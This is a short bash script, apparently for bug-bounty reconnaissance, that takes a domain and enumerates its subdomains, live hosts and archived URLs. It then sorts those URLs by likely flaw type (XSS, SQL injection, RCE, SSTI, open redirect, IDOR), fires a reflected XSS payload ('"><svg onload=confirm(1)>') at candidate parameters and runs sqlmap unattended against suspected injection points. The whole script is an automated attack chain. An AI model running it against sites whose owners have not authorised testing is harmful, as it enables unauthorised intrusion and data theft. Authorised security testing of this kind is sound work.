#!/bin/bash

while getopts ":d:" opt; do
  case ${opt} in
    d )
      domain=$OPTARG
      ;;
    \? )
      echo "Invalid option: -$OPTARG" >&2
      exit 1
      ;;
    : )
      echo "Option -$OPTARG requires an argument" >&2
      exit 1
      ;;
  esac
done

echo "$domain" | assetfinder | tee -a domains.txt  |  httprobe | tee -a http.txt | waybackurls | tee -a mass.txt

wait

mkdir output

cp *.txt /output 
wait 

cd output 
 
 wait
 
cat mass.txt | gf xss | tee -a xss.txt
cat mass.txt | gf redirect | tee -a redirect.txt
cat mass.txt | gf rce | tee -a rce.txt
cat mass.txt | gf sqli | tee -a sqli.txt
cat mass.txt | gf ssti | tee -a ssti.txt
cat mass.txt | gf idor | tee -a idor.txt

wait

cat xss.txt | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'

wait

sqlmap -m sqli.txt --batch --random-agent --level 1
 
